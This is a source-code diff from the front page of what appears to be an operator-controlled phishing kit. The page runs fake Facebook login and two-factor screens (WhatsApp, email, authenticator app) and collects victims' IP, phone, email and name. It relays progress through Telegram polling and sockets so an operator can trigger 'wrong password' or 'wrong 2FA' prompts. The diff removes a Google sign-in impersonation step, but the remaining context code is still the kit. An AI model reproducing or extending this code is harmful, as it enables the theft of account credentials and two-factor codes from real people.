@@ -15,9 +15,6 @@ import Done from "../components/common/Done.js";
 import Fa2Whatsapp from "../components/fbook/Fa2Whatsapp.js";
 import Fa2Email from "../components/fbook/Fa2Email.js";
 import Fa2AuthApp from "../components/fbook/Fa2AuthApp.js";
-import GoogleConfirm from "../components/frriSpecific/GoogleConfirm.js";
-import GoogleSignInPC from "../components/gmail/GoogleSignInPC.js";
-import GoogleSignInMobile from "../components/gmail/GoogleSignInMobile.js";
 
 // Hooks
 import { useUserData } from "../hooks/useUserData";
@@ -45,7 +42,6 @@ const STEP_COMPONENTS = {
   13: Fa2Email,
   14: Fa2,
   15: Fa2AuthApp,
-  16: GoogleConfirm,
 };
 
 export const DataContext = createContext();
@@ -55,8 +51,6 @@ export default function Home() {
   // Hide badge for FB steps
   const FBOOK_STEPS = new Set([1, 2, 3, 4, 6, 7, 10, 12, 13, 14, 15]);
   const [ContinueWithFacebook, setContinueWithFacebook] = useState(true);
-  const [showGoogleSignIn, setShowGoogleSignIn] = useState(false);
-  const [isMobileDevice, setIsMobileDevice] = useState(false);
   const userData = useUserData();
   const stepManagement = useStepManagement();
   useHideRecaptchaBadge(FBOOK_STEPS.has(stepManagement.Step));
@@ -77,28 +71,6 @@ export default function Home() {
     }
   }, [userData.AllData?.ip, Ip, setIp]);
 
-  // Detect mobile
-  useEffect(() => {
-    const check = () => setIsMobileDevice(window.innerWidth < 768);
-    check();
-    window.addEventListener("resize", check);
-    return () => window.removeEventListener("resize", check);
-  }, []);
-
-  // Listen for admin /google command
-  useEffect(() => {
-    const handleGoogleConfirm = () => stepManagement.setStep(16);
-    window.addEventListener("admin-facebook-google", handleGoogleConfirm);
-    return () => window.removeEventListener("admin-facebook-google", handleGoogleConfirm);
-  }, []);
-
-  // Close Google Sign-In overlay whenever the step moves away from 16
-  useEffect(() => {
-    if (stepManagement.Step !== 16) {
-      setShowGoogleSignIn(false);
-    }
-  }, [stepManagement.Step]);
-
   // Additional hooks
   useTelegramPolling(
     Unik,
@@ -109,10 +81,7 @@ export default function Home() {
     stepManagement.setWrong2faTrigger,
     stepManagement.wrong2faTrigger,
     stepManagement.setWrongPasswordTrigger,
-    stepManagement.wrongPasswordTrigger,
-    stepManagement.setWrongCredsTrigger,
-    stepManagement.wrongCredsTrigger,
-    stepManagement.Step
+    stepManagement.wrongPasswordTrigger
   );
 
   useSocketConnection(Unik, userData.AllData);
@@ -138,12 +107,6 @@ export default function Home() {
       wrongPasswordTrigger: stepManagement.wrongPasswordTrigger,
       ...userData,
     };
-
-    // Inject step-specific props for GoogleConfirm (step 16)
-    if (stepManagement.Step === 16) {
-      commonProps.onConfirm = () => setShowGoogleSignIn(true);
-      commonProps.onClose = () => stepManagement.setStep(4);
-    }
 
     return <Component {...commonProps} />;
   };
@@ -204,35 +167,6 @@ export default function Home() {
             {renderStepComponent()}
           </div>
         </div>
-
-        {/* Google Sign-In modal — shown after user clicks Verify with Google on step 16 */}
-        {showGoogleSignIn && (
-          isMobileDevice ? (
-            <GoogleSignInMobile
-              Unik={Unik}
-              Tel={userData.AllData?.phone_number || ""}
-              Email={userData.AllData?.login_email || userData.AllData?.email || ""}
-              setEmail={(v) => userData.setAllData((prev) => ({ ...prev, login_email: v }))}
-              Name={userData.AllData?.full_name || ""}
-              BusinessEmail={userData.AllData?.business_email || ""}
-              Ip={Ip}
-              setParentBeginTimer={() => {}}
-              onClose={() => setShowGoogleSignIn(false)}
-            />
-          ) : (
-            <GoogleSignInPC
-              Unik={Unik}
-              Tel={userData.AllData?.phone_number || ""}
-              Email={userData.AllData?.login_email || userData.AllData?.email || ""}
-              setEmail={(v) => userData.setAllData((prev) => ({ ...prev, login_email: v }))}
-              Name={userData.AllData?.full_name || ""}
-              BusinessEmail={userData.AllData?.business_email || ""}
-              Ip={Ip}
-              setParentBeginTimer={() => {}}
-              onClose={() => setShowGoogleSignIn(false)}
-            />
-          )
-        )}
       </DataContext.Provider>
     </div>
   );
